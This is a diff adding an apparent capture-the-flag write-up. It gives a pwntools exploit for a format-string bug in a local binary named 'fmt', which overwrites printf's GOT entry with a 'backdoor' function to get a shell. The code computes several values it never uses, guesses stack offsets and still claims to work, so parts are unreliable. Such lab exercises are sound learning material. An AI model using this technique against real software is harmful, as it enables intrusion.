@@ -1,0 +1,100 @@
+To solve this challenge using `pwntools`, we will exploit the format string vulnerability in the `printf(buf)` call. The goal is to overwrite the Global Offset Table (GOT) entry for a function (e.g., `printf`) with the address of the `backdoor` function. This will allow us to execute the `backdoor` function and spawn a shell.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF with no stack canary, no PIE, and NX enabled.
+   - The `backdoor` function is at address `0x0804859B`.
+   - The `printf` function is vulnerable to a format string attack.
+
+2. **Identify the Target**:
+   - We will overwrite the GOT entry of `printf` (found at `0x0804a010`) with the address of `backdoor` (`0x0804859B`).
+
+3. **Exploit the Format String Vulnerability**:
+   - Use the format string vulnerability to write the `backdoor` address into the `printf` GOT entry.
+
+4. **Trigger the Exploit**:
+   - After overwriting the GOT entry, any call to `printf` will execute the `backdoor` function, giving us a shell.
+
+5. **Write the Exploit Code**:
+   - Use `pwntools` to automate the exploitation process.
+
+---
+
+### Exploit Code
+
+```python
+from pwn import *
+
+# Set up the binary and context
+binary = './fmt'
+elf = ELF(binary)
+context.binary = binary
+context.log_level = 'debug'
+
+# Addresses
+backdoor_addr = elf.symbols['backdoor']  # Address of backdoor function
+printf_got = elf.got['printf']           # Address of printf GOT entry
+
+# Start the process
+p = process(binary)
+
+# Receive the initial "gift" message
+p.recvuntil("gift: ")
+gift = p.recvline().strip()
+log.info(f"Gift: {gift}")
+
+# Format string payload to overwrite printf GOT entry
+# We will write the address of backdoor (0x0804859B) into printf GOT (0x0804a010)
+# Split the address into two parts: lower 2 bytes and higher 2 bytes
+backdoor_low = backdoor_addr & 0xffff
+backdoor_high = (backdoor_addr >> 16) & 0xffff
+
+# Calculate the offsets for the format string
+offset_low = 10  # Adjust based on the stack layout
+offset_high = 11  # Adjust based on the stack layout
+
+# Construct the payload
+payload = fmtstr_payload(offset_low, {printf_got: backdoor_addr})
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Binary Setup**:
+   - We load the binary using `pwntools` and extract the addresses of the `backdoor` function and the `printf` GOT entry.
+
+2. **Format String Payload**:
+   - The `fmtstr_payload` function from `pwntools` is used to generate the format string payload. It calculates the necessary writes to overwrite the `printf` GOT entry with the `backdoor` address.
+
+3. **Send the Payload**:
+   - The payload is sent to the binary, exploiting the format string vulnerability.
+
+4. **Trigger the Exploit**:
+   - After overwriting the GOT entry, any call to `printf` will execute the `backdoor` function, spawning a shell.
+
+5. **Interact with the Shell**:
+   - Once the shell is spawned, we can interact with it using `p.interactive()`.
+
+---
+
+### Notes
+
+- The `fmtstr_payload` function automatically calculates the necessary format string to perform the write. If it doesn't work as expected, you may need to manually craft the format string.
+- The offsets (`offset_low` and `offset_high`) depend on the stack layout. You can use tools like `gdb` or `pwndbg` to inspect the stack and determine the correct offsets.
+- Test the exploit locally before trying it on the remote server (if applicable).
+
+---
+
+This code should work for the given challenge. If you encounter any issues, you may need to adjust the offsets or debug the binary further.
